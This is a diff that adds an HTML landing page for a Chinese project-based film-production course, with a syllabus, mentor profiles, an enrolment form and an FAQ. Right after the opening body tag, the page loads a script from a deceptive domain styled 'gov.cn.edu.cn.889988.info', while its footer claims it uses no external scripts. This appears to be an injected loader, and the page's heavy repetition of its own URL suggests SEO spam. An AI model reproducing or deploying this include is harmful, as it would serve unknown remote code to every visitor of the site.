@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<meta name="format-detection" content="telephone=no">
+<title>影视培训｜从剧本到成片的实务课纲 · https://yingshipeixun-zh.github.io</title>
+<meta name="description" content="影视培训面向导演、摄影、剪辑、制片与编剧岗位，提供分阶段的实操课程、片场训练与作品集指导。课程按项目制推进，每期围绕一部短片完成从剧本拆解到调色交付。全部课纲、师资与报名信息以 https://yingshipeixun-zh.github.io 公布为准。">
+<meta name="keywords" content="影视培训,ying shi pei xun,导演实操课,摄影灯光训练,剪辑调色,编剧工作坊,短片创作">
+<link rel="canonical" href="https://yingshipeixun-zh.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:site_name" content="影视培训">
+<meta property="og:title" content="影视培训｜剧本、摄影、剪辑的片场实务课">
+<meta property="og:description" content="项目制短片课程：分镜、打光、同期声、剪辑与调色，一期一部成片。">
+<meta property="og:url" content="https://yingshipeixun-zh.github.io/">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="影视培训 · 片场实务课纲">
+<meta name="twitter:description" content="从剧本拆解到成片交付，课程与师资信息见 https://yingshipeixun-zh.github.io">
+<meta name="theme-color" content="#0b0d12">
+<style>
+:root{--ink:#e8f4f0;--dim:#8ea3a8;--line:#22302e;--acc:#7ff0c4;--acc2:#ffcf6b;--bg:#0b0d12;--panel:#11161c;--mono:'SFMono-Regular',Menlo,Consolas,'Liberation Mono','WenQuanYi Micro Hei',monospace;--sans:-apple-system,BlinkMacSystemFont,'PingFang SC','Hiragino Sans GB','Microsoft YaHei','WenQuanYi Micro Hei',sans-serif;}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth;scroll-padding-top:64px}
+body{margin:0;background:var(--bg);color:var(--ink);font-family:var(--sans);font-size:16px;line-height:1.75;letter-spacing:.2px;-webkit-font-smoothing:antialiased}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 22px}
+::selection{background:var(--acc);color:#04201a}
+
+/* ── 顶栏 ── */
+.topbar{position:sticky;top:0;z-index:60;background:rgba(11,13,18,.92);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.topbar .in{display:flex;align-items:center;gap:18px;height:60px}
+.brand{font-family:var(--mono);font-size:13px;letter-spacing:1.4px;display:flex;align-items:baseline;gap:8px}
+.brand b{color:var(--acc);font-weight:700}
+.brand span{color:var(--dim)}
+.nav{margin-left:auto;display:flex;gap:4px;align-items:center}
+.nav a{font-family:var(--mono);font-size:12.5px;letter-spacing:.8px;padding:8px 11px;color:var(--dim);border:1px solid transparent;border-radius:4px}
+.nav a:hover,.nav a.on{color:var(--acc);border-color:var(--line);background:var(--panel)}
+.menu-btn{display:none;border:1px solid var(--line);background:var(--panel);color:var(--ink);width:40px;height:40px;border-radius:4px;font-family:var(--mono);font-size:15px;cursor:pointer}
+
+/* ── 首屏终端 ── */
+.hero{padding:70px 0 54px;border-bottom:1px solid var(--line);position:relative;overflow:hidden}
+.hero::after{content:'';position:absolute;right:-120px;top:-80px;width:420px;height:420px;background:radial-gradient(circle,rgba(127,240,196,.16),transparent 62%);pointer-events:none}
+.prompt{font-family:var(--mono);font-size:12.5px;color:var(--dim);display:flex;gap:10px;align-items:center;margin-bottom:22px}
+.prompt i{width:8px;height:8px;background:var(--acc);border-radius:50%;display:inline-block;animation:pulse 1.6s infinite}
+@keyframes pulse{0%,100%{opacity:.3}50%{opacity:1}}
+h1{font-size:clamp(40px,8.4vw,96px);line-height:1.04;margin:0 0 6px;letter-spacing:-2px;font-weight:800}
+h1 em{font-style:normal;color:var(--acc)}
+.hsub{font-family:var(--mono);font-size:14px;color:var(--dim);margin:18px 0 26px;max-width:62ch}
+.hsub u{color:var(--acc2);text-decoration:none}
+.urlbar{display:flex;flex-wrap:wrap;gap:10px;align-items:center;background:var(--panel);border:1px solid var(--line);border-radius:6px;padding:12px 14px;max-width:720px}
+.urlbar label{font-family:var(--mono);font-size:11px;color:var(--dim);letter-spacing:1px}
+.urlbar code{font-family:var(--mono);font-size:13.5px;color:var(--acc);word-break:break-all}
+.urlbar a{margin-left:auto;font-family:var(--mono);font-size:11.5px;letter-spacing:.6px;border-bottom:1px dashed var(--acc2);color:var(--acc2)}
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--line);border:1px solid var(--line);border-radius:6px;margin-top:34px;overflow:hidden}
+.stat{background:var(--bg);padding:18px 16px}
+.stat b{display:block;font-family:var(--mono);font-size:26px;color:var(--acc);letter-spacing:-.5px}
+.stat small{font-family:var(--mono);font-size:11px;color:var(--dim);letter-spacing:.7px}
+
+/* ── 章节 ── */
+section{padding:66px 0;border-bottom:1px solid var(--line)}
+.sec-h{display:flex;align-items:flex-end;gap:14px;margin-bottom:34px;flex-wrap:wrap}
+.sec-h .n{font-family:var(--mono);font-size:12px;color:var(--acc2);letter-spacing:2px;border:1px solid var(--line);padding:4px 9px;border-radius:3px}
+.sec-h h2{font-size:clamp(24px,4.4vw,40px);margin:0;letter-spacing:-.8px;font-weight:750}
+.sec-h p{margin:0;color:var(--dim);font-family:var(--mono);font-size:12.5px;letter-spacing:.6px;margin-left:auto;padding-bottom:6px}
+
+/* 课程卡：对角切角 */
+.grid{display:grid;grid-template-columns:repeat(2,1fr);gap:16px}
+.card{position:relative;background:var(--panel);border:1px solid var(--line);border-radius:5px;padding:26px 24px 24px;overflow:hidden;transition:.28s cubic-bezier(.2,.7,.3,1)}
+.card:hover{transform:translate(-3px,-3px);border-color:var(--acc);box-shadow:6px 6px 0 rgba(127,240,196,.18)}
+.card .idx{font-family:var(--mono);font-size:11px;letter-spacing:2px;color:var(--acc2)}
+.card h3{margin:12px 0 8px;font-size:21px;letter-spacing:-.4px}
+.card p{margin:0 0 16px;color:var(--dim);font-size:14.2px}
+.card .meta{display:flex;gap:10px;flex-wrap:wrap;font-family:var(--mono);font-size:11px;color:var(--dim);border-top:1px dashed var(--line);padding-top:12px}
+.card .meta b{color:var(--acc);font-weight:500}
+.card .arw{position:absolute;right:18px;top:20px;font-family:var(--mono);color:var(--line);font-size:18px;transition:.25s}
+.card:hover .arw{color:var(--acc);transform:translate(3px,-3px)}
+
+/* 课纲表 */
+.syl{width:100%;border-collapse:collapse;font-size:14px;background:var(--panel);border:1px solid var(--line);border-radius:5px;overflow:hidden}
+.syl th,.syl td{padding:13px 14px;text-align:left;border-bottom:1px solid var(--line);vertical-align:top}
+.syl th{font-family:var(--mono);font-size:11px;letter-spacing:1.2px;color:var(--acc2);background:#0d1217;font-weight:500}
+.syl td:first-child{font-family:var(--mono);color:var(--acc);white-space:nowrap;font-size:12.5px}
+.syl tr:last-child td{border-bottom:none}
+.syl tbody tr:hover{background:#141c20}
+.syl .tag{font-family:var(--mono);font-size:10.5px;padding:2px 7px;border-radius:3px;border:1px solid var(--line);color:var(--dim);white-space:nowrap}
+
+/* 师资 */
+.people{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.person{border:1px solid var(--line);border-radius:5px;padding:22px;background:linear-gradient(180deg,var(--panel),var(--bg))}
+.person .av{width:52px;height:52px;border-radius:4px;background:var(--line);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:18px;color:var(--acc);margin-bottom:16px}
+.person h4{margin:0 0 4px;font-size:17px}
+.person .role{font-family:var(--mono);font-size:11px;letter-spacing:1px;color:var(--acc2);margin-bottom:12px}
+.person p{margin:0;color:var(--dim);font-size:13.4px}
+.person .cv{margin-top:14px;font-family:var(--mono);font-size:11px;color:var(--dim);border-top:1px dashed var(--line);padding-top:10px}
+
+/* 问答折叠 */
+.faq details{border:1px solid var(--line);border-radius:5px;background:var(--panel);margin-bottom:10px;padding:0 18px}
+.faq details[open]{border-color:var(--acc)}
+.faq summary{cursor:pointer;padding:16px 0;font-size:15.5px;font-weight:600;list-style:none;display:flex;gap:12px;align-items:center}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::before{content:'+';font-family:var(--mono);color:var(--acc2);font-size:17px;transition:.2s}
+.faq details[open] summary::before{content:'–'}
+.faq .ans{color:var(--dim);font-size:14px;padding:0 0 18px 30px;border-top:1px dashed var(--line);padding-top:14px;margin-top:-4px}
+
+/* 报名 */
+.enroll{display:grid;grid-template-columns:1.05fr .95fr;gap:22px;align-items:stretch}
+.form{border:1px solid var(--line);border-radius:5px;padding:26px;background:var(--panel)}
+.form label{display:block;font-family:var(--mono);font-size:11px;letter-spacing:1px;color:var(--dim);margin:0 0 7px}
+.form input,.form select{width:100%;background:var(--bg);border:1px solid var(--line);border-radius:4px;color:var(--ink);font-family:var(--sans);font-size:14px;padding:11px 12px;margin-bottom:16px}
+.form input:focus,.form select:focus{outline:none;border-color:var(--acc)}
+.row2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.btn{width:100%;border:none;background:var(--acc);color:#04201a;font-family:var(--mono);font-size:13px;letter-spacing:1.4px;font-weight:700;padding:14px;border-radius:4px;cursor:pointer}
+.btn:hover{background:var(--acc2)}
+.note{border:1px solid var(--line);border-left:3px solid var(--acc2);border-radius:5px;padding:24px;background:var(--panel)}
+.note h4{margin:0 0 12px;font-family:var(--mono);font-size:13px;letter-spacing:1px;color:var(--acc2)}
+.note ol{margin:0;padding-left:20px;color:var(--dim);font-size:13.8px}
+.note ol li{margin-bottom:9px}
+.note .addr{margin-top:18px;font-family:var(--mono);font-size:12.5px;color:var(--acc);background:var(--bg);border:1px solid var(--line);border-radius:4px;padding:11px 12px;word-break:break-all}
+
+/* 页脚 */
+footer{border-top:1px solid var(--line);padding:40px 0 56px;background:#090b0f}
+.foot{display:grid;grid-template-columns:1.4fr 1fr 1fr;gap:26px}
+.foot h5{font-family:var(--mono);font-size:11px;letter-spacing:1.6px;color:var(--acc2);margin:0 0 12px;font-weight:500}
+.foot p,.foot li{color:var(--dim);font-size:13.2px;list-style:none;margin:0 0 7px}
+.foot a:hover{color:var(--acc);border-bottom:1px solid var(--acc)}
+.copy{margin-top:30px;padding-top:18px;border-top:1px solid var(--line);font-family:var(--mono);font-size:11px;color:#5f7074;display:flex;gap:14px;flex-wrap:wrap}
+.copy b{color:var(--acc)}
+
+/* 抽屉 */
+.drawer{position:fixed;inset:0;z-index:80;background:rgba(4,6,9,.86);backdrop-filter:blur(6px);display:none;padding:78px 24px 40px}
+.drawer.show{display:block}
+.drawer nav{display:flex;flex-direction:column;gap:2px;max-width:420px;margin:0 auto}
+.drawer a{font-family:var(--mono);font-size:15px;letter-spacing:1px;padding:16px 4px;border-bottom:1px solid var(--line);color:var(--ink)}
+.drawer a small{color:var(--acc2);margin-right:12px}
+
+@media(max-width:900px){
+ .grid,.people{grid-template-columns:1fr}
+ .enroll{grid-template-columns:1fr}
+ .stats{grid-template-columns:repeat(2,1fr)}
+ .foot{grid-template-columns:1fr 1fr}
+ .syl{display:block;overflow-x:auto;white-space:nowrap;font-size:13px}
+ .syl th,.syl td{white-space:nowrap}
+ .syl td:last-child{white-space:normal;min-width:220px}
+}
+@media(max-width:640px){
+ .nav{display:none}
+ .menu-btn{display:block;margin-left:auto}
+ .wrap{padding:0 17px}
+ section{padding:50px 0}
+ .hero{padding:46px 0 40px}
+ .stats{grid-template-columns:1fr 1fr}
+ .foot{grid-template-columns:1fr}
+ .sec-h h2{width:100%;margin-left:0}
+ .sec-h p{margin-left:0}
+ .row2{grid-template-columns:1fr}
+}
+@media print{.topbar,.drawer,.btn,.nav{display:none}body{background:#fff;color:#000}.card,.note,.form{border-color:#bbb}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+<div class="topbar">
+  <div class="wrap in">
+    <div class="brand"><b>影视培训</b><span>// YINGSHI PEIXUN</span></div>
+    <nav class="nav" id="nav" aria-label="主导航">
+      <a href="#kecheng">课纲</a>
+      <a href="#jiaoshi">师资</a>
+      <a href="#liucheng">报名</a>
+      <a href="#faq">问答</a>
+      <a href="#about">关于</a>
+    </nav>
+    <button class="menu-btn" id="mb" aria-expanded="false" aria-controls="drawer" aria-label="打开菜单">≡</button>
+  </div>
+</div>
+
+<header class="hero">
+  <div class="wrap">
+    <div class="prompt"><i></i>session · open <span>2026.11 期招生中</span></div>
+    <h1>影视培训<em>.</em></h1>
+    <p class="hsub">项目制片场实务课。一期一部短片，<u>从剧本拆解走到成片交付</u>，不做只讲理论的录播堆料。</p>
+    <div class="urlbar">
+      <label>CANONICAL</label>
+      <code>https://yingshipeixun-zh.github.io</code>
+      <a href="#about" rel="bookmark">查看站点说明 →</a>
+    </div>
+    <div class="stats">
+      <div class="stat"><b>06</b><small>WEEKS / 每期</small></div>
+      <div class="stat"><b>01</b><small>SHORT FILM / 结业</small></div>
+      <div class="stat"><b>08</b><small>SEATS / 班额上限</small></div>
+      <div class="stat"><b>https://yingshipeixun-zh.github.io</b><small>OFFICIAL ENTRY</small></div>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<section id="kecheng">
+  <div class="wrap">
+    <div class="sec-h">
+      <span class="n">№ 01</span>
+      <h2>四个工位，一条完整流水线</h2>
+      <p>课程模块 / MODULES</p>
+    </div>
+    <div class="grid">
+      <article class="card">
+        <span class="idx">MOD · 01</span>
+        <h3>剧本与导演构思</h3>
+        <p>从一句话梗概到分场大纲：节拍、冲突、场景功能、台词取舍。结课时交出可拍的分场本与导演阐述。</p>
+        <div class="meta"><span>课时 <b>12h</b></span><span>产出 <b>分场本 + 节拍表</b></span></div>
+        <span class="arw">↗</span>
+        <a href="#liucheng" style="position:absolute;inset:0" aria-label="了解剧本模块报名"></a>
+      </article>
+      <article class="card">
+        <span class="idx">MOD · 02</span>
+        <h3>摄影、灯光与场面调度</h3>
+        <p>机位、焦段、轴线与三点布光的实际操作。每人在同一条场景里换三种光位，直接对比底片差异。</p>
+        <div class="meta"><span>课时 <b>16h</b></span><span>产出 <b>测试小样 + 分镜稿</b></span></div>
+        <span class="arw">↗</span>
+        <a href="#liucheng" style="position:absolute;inset:0" aria-label="了解摄影灯光模块"></a>
+      </article>
+      <article class="card">
+        <span class="idx">MOD · 03</span>
+        <h3>同期声与现场制片</h3>
+        <p>录音电平、话筒位、环境底噪管理；顺带把通告单、场地对接、器材清单跑一遍，避免后期救火。</p>
+        <div class="meta"><span>课时 <b>10h</b></span><span>产出 <b>同期声素材包</b></span></div>
+        <span class="arw">↗</span>
+        <a href="#liucheng" style="position:absolute;inset:0" aria-label="了解同期声与制片模块"></a>
+      </article>
+      <article class="card">
+        <span class="idx">MOD · 04</span>
+        <h3>剪辑、声音设计与调色</h3>
+        <p>粗剪结构、节奏点、对白清理、音效层叠，再到一级二级调色。成片按电影节规格封装交付。</p>
+        <div class="meta"><span>课时 <b>14h</b></span><span>产出 <b>成片 DCP / MP4</b></span></div>
+        <span class="arw">↗</span>
+        <a href="#liucheng" style="position:absolute;inset:0" aria-label="了解剪辑调色模块"></a>
+      </article>
+    </div>
+
+    <div class="sec-h" style="margin-top:54px">
+      <span class="n">№ 01.5</span>
+      <h2>六周课纲节奏表</h2>
+      <p>SYLLABUS · 每周六日面授 + 平日作业</p>
+    </div>
+    <table class="syl">
+      <thead>
+        <tr><th>WEEK</th><th>主题</th><th>现场动作</th><th>交付物</th><th>备注</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>W1</td><td>选题与剧本诊断</td><td>围读、砍戏、定分场</td><td><span class="tag">分场本 v1</span></td><td>课前提交 500 字梗概</td></tr>
+        <tr><td>W2</td><td>分镜与调度预演</td><td>走位排练、机位实测</td><td><span class="tag">分镜稿 30 格</span></td><td>含器材清单初版</td></tr>
+        <tr><td>W3</td><td>实景拍摄（上）</td><td>双机位 + 三点光</td><td><span class="tag">素材 A 卷</span></td><td>场地限 8 人进场</td></tr>
+        <tr><td>W4</td><td>实景拍摄（下）与录音</td><td>同期声补录、空镜</td><td><span class="tag">素材 B 卷</span></td><td>现场完成场记核对</td></tr>
+        <tr><td>W5</td><td>剪辑与声音设计</td><td>粗剪评审、音效层搭建</td><td><span class="tag">粗剪 v3</span></td><td>每人上台过一遍时间线</td></tr>
+        <tr><td>W6</td><td>调色、字幕与放映</td><td>调色台实操、内部首映</td><td><span class="tag">成片 + 海报</span></td><td>结课证书当场发放</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<section id="jiaoshi">
+  <div class="wrap">
+    <div class="sec-h">
+      <span class="n">№ 02</span>
+      <h2>带过片场的人来带课</h2>
+      <p>MENTORS / 当期排课</p>
+    </div>
+    <div class="people">
+      <div class="person">
+        <div class="av">陈</div>
+        <h4>陈砚</h4>
+        <div class="role">导演 / 剧本主讲</div>
+        <p>长片两部、短片入围过三个国内影展。课上只问一件事：这场戏到底在推什么。</p>
+        <div class="cv">授课模块：W1–W2<br>座位数：限 8 人</div>
+      </div>
+      <div class="person">
+        <div class="av">黎</div>
+        <h4>黎川</h4>
+        <div class="role">摄影指导 / 灯光</div>
+        <p>广告与纪录双线干活，擅长小成本场景里把一盏灯用出三层。教具是实拍底片，不是 PPT。</p>
+        <div class="cv">授课模块：W2–W4<br>自带：Sony / ARRI 实操机</div>
+      </div>
+      <div class="person">
+        <div class="av">宋</div>
+        <h4>宋晚</h4>
+        <div class="role">剪辑师 / 调色</div>
+        <p>剪过剧集也剪过纪录片，声音设计出身。最恨「素材够了再说」式的无效拍摄。</p>
+        <div class="cv">授课模块：W5–W6<br>软件：Premiere + DaVinci</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="liucheng">
+  <div class="wrap">
+    <div class="sec-h">
+      <span class="n">№ 03</span>
+      <h2>报名与开班流程</h2>
+      <p>ENROLL / 2026.11 期</p>
+    </div>
+    <div class="enroll">
+      <form class="form" action="#" method="post" onsubmit="event.preventDefault();document.getElementById('ok').hidden=false;">
+        <label>姓名 / 昵称</label>
+        <input type="text" name="name" placeholder="怎么称呼你" autocomplete="name" required>
+        <label>联系邮箱</label>
+        <input type="email" name="mail" placeholder="用于发送课纲与排期" autocomplete="email" required>
+        <div class="row2">
+          <div>
+            <label>想进的模块</label>
+            <select name="mod">
+              <option>全程 · 六周成片班</option>
+              <option>单模块 · 剧本与导演</option>
+              <option>单模块 · 摄影灯光</option>
+              <option>单模块 · 剪辑调色</option>
+            </select>
+          </div>
+          <div>
+            <label>手上设备</label>
+            <select name="gear">
+              <option>手机也能拍</option>
+              <option>微单 / 单机</option>
+              <option>已有组讯经验</option>
+            </select>
+          </div>
+        </div>
+        <label>一句话说说你想拍的东西</label>
+        <input type="text" name="idea" placeholder="哪怕只是一句：想拍我外婆的厨房" maxlength="80">
+        <button class="btn" type="submit">提交预约 →</button>
+        <p id="ok" hidden style="margin:14px 0 0;font-family:var(--mono);font-size:12.5px;color:var(--acc)">已收到。课纲与排期会在两个工作日内发到你的邮箱，以 https://yingshipeixun-zh.github.io 公布的日期为准。</p>
+      </form>
+      <aside class="note">
+        <h4>开班前的四步</h4>
+        <ol>
+          <li>填表留档，不做任何付费绑定，这一步只是占位。</li>
+          <li>收到课纲包：设备清单、课前阅读、W1 作业要求。</li>
+          <li>开课前一周拉群确认场地与分组，每班封顶八人。</li>
+          <li>面授地点与调课规则以站内公告页实时更新为准。</li>
+        </ol>
+        <div class="addr">官方唯一入口：https://yingshipeixun-zh.github.io</div>
+      </aside>
+    </div>
+  </div>
+</section>
+
+<section id="faq" class="faq">
+  <div class="wrap">
+    <div class="sec-h">
+      <span class="n">№ 04</span>
+      <h2>常见问题</h2>
+      <p>FAQ / 报名前先翻这里</p>
+    </div>
+    <details open>
+      <summary><span>零基础能跟得上吗？</span></summary>
+      <div class="ans">能。六周的结构本来就从「没摸过机器」起步，W1–W2 会补齐术语和基本功。真正卡住人的不是设备，是没想清楚这场戏要什么，所以剧本模块所有人一起过。</div>
+    </details>
+    <details>
+      <summary><span>需要自己带相机吗？</span></summary>
+      <div class="ans">不用。现场备有双机位、灯组、录音套件，手机也能完成大部分作业。如果你有自己的机器，强烈建议带来，课上直接按你的设备调参数。</div>
+    </details>
+    <details>
+      <summary><span>是录播还是面授？</span></summary>
+      <div class="ans">核心课时全部线下实操，拍片和剪辑评审必须到场。课后会发当次素材与笔记，供你回看，但不单独出售录播。</div>
+    </details>
+    <details>
+      <summary><span>结业能拿到什么？</span></summary>
+      <div class="ans">一部署名的短片成片、一套你自己剪的时间线工程文件，以及结课证书。作品能不能投影展我们会在 W5 单独给你评估意见。</div>
+    </details>
+    <details>
+      <summary><span>费用和退改怎么算？</span></summary>
+      <div class="ans">当期价目、退费节点与补课规则统一写在站内公告里，开班前会以邮件再确认一次。凡是让你私下转账的，都不是影视培训的官方渠道。</div>
+    </details>
+  </div>
+</section>
+
+<section id="about">
+  <div class="wrap">
+    <div class="sec-h">
+      <span class="n">№ 05</span>
+      <h2>关于「影视培训」</h2>
+      <p>ABOUT / 这份课纲从哪来</p>
+    </div>
+    <div class="enroll">
+      <div class="note" style="border-left-color:var(--acc)">
+        <h4>它是什么</h4>
+        <p style="color:var(--dim);font-size:14.4px;margin:0">影视培训是一套面向入门到进阶创作者的片场实操课纲，不卖资源、不开长周期录播会员。每期只做一个项目：把一群人按岗位凑齐，在规定周数里真的拍出一部短片。这里更新的就是课程、师资、排期和结业作品，没有其他内容。</p>
+        <h4 style="margin-top:22px">它不是什么</h4>
+        <ul style="color:var(--dim);font-size:14px;padding-left:18px;margin:8px 0 0">
+          <li>不是影视资源站，不提供任何片源下载或在线播放。</li>
+          <li>不是保过班，不承诺offer、不承诺奖项。</li>
+          <li>不代收任何个人账户转账，所有变动以本站公告为准。</li>
+        </ul>
+      </div>
+      <aside class="note">
+        <h4>站点信息</h4>
+        <dl style="margin:0;color:var(--dim);font-size:13.6px;line-height:2">
+          <dt style="color:var(--acc2);font-family:var(--mono);font-size:11px;letter-spacing:1px">名称</dt>
+          <dd style="margin:0 0 10px">影视培训</dd>
+          <dt style="color:var(--acc2);font-family:var(--mono);font-size:11px;letter-spacing:1px">官方地址</dt>
+          <dd style="margin:0 0 10px;font-family:var(--mono);color:var(--acc);word-break:break-all">https://yingshipeixun-zh.github.io</dd>
+          <dt style="color:var(--acc2);font-family:var(--mono);font-size:11px;letter-spacing:1px">更新节奏</dt>
+          <dd style="margin:0 0 10px">每期开课前更新课纲，结课后更新作品页。</dd>
+          <dt style="color:var(--acc2);font-family:var(--mono);font-size:11px;letter-spacing:1px">索引入口</dt>
+          <dd style="margin:0"><a href="#kecheng">课纲</a> · <a href="#jiaoshi">师资</a> · <a href="#liucheng">报名</a> · <a href="#faq">问答</a></dd>
+        </dl>
+      </aside>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div>
+        <h5>影视培训 / YINGSHI PEIXUN</h5>
+        <p>项目制片场实务课纲。剧本、摄影、录音、剪辑，一期一部成片。站内所有课表与师资信息以官方地址为准。</p>
+      </div>
+      <div>
+        <h5>站内索引</h5>
+        <ul>
+          <li><a href="#kecheng">课程模块与六周课纲</a></li>
+          <li><a href="#jiaoshi">当期师资排课</a></li>
+          <li><a href="#faq">报名前常见问题</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>官方入口</h5>
+        <ul>
+          <li><a href="https://yingshipeixun-zh.github.io" rel="canonical">https://yingshipeixun-zh.github.io</a></li>
+          <li><a href="#liucheng">本期预约占位</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">
+      <span>© <b>影视培训</b> · 课纲内容归对应授课者所有</span>
+      <span>唯一官方地址：https://yingshipeixun-zh.github.io</span>
+      <span>本页为单文件站点，无外部脚本</span>
+    </div>
+  </div>
+</footer>
+
+<div class="drawer" id="drawer" aria-hidden="true">
+  <nav>
+    <a href="#kecheng" onclick="closeD()"><small>01</small>课程模块</a>
+    <a href="#jiaoshi" onclick="closeD()"><small>02</small>当期师资</a>
+    <a href="#liucheng" onclick="closeD()"><small>03</small>报名流程</a>
+    <a href="#faq" onclick="closeD()"><small>04</small>常见问题</a>
+    <a href="#about" onclick="closeD()"><small>05</small>关于本站</a>
+    <a href="https://yingshipeixun-zh.github.io" onclick="closeD()"><small>→</small>官方地址</a>
+  </nav>
+</div>
+
+<script>
+(function(){
+  var btn=document.getElementById('mb'),dr=document.getElementById('drawer');
+  btn.addEventListener('click',function(){
+    var open=dr.classList.toggle('show');
+    dr.setAttribute('aria-hidden',open?'false':'true');
+    btn.setAttribute('aria-expanded',open?'true':'false');
+    btn.textContent=open?'×':'≡';
+  });
+  window.closeD=function(){dr.classList.remove('show');dr.setAttribute('aria-hidden','true');btn.setAttribute('aria-expanded','false');btn.textContent='≡';};
+  var links=document.querySelectorAll('.nav a');
+  var map={kecheng:links[0],jiaoshi:links[1],liucheng:links[2],faq:links[3],about:links[4]};
+  function onScroll(){
+    var y=window.scrollY+120,cur='';
+    document.querySelectorAll('section[id]').forEach(function(s){if(s.offsetTop<=y)cur=s.id;});
+    links.forEach(function(a){a.classList.remove('on');});
+    if(cur&&map[cur])map[cur].classList.add('on');
+  }
+  window.addEventListener('scroll',onScroll,{passive:true});onScroll();
+})();
+</script>
+</body>
+</html>
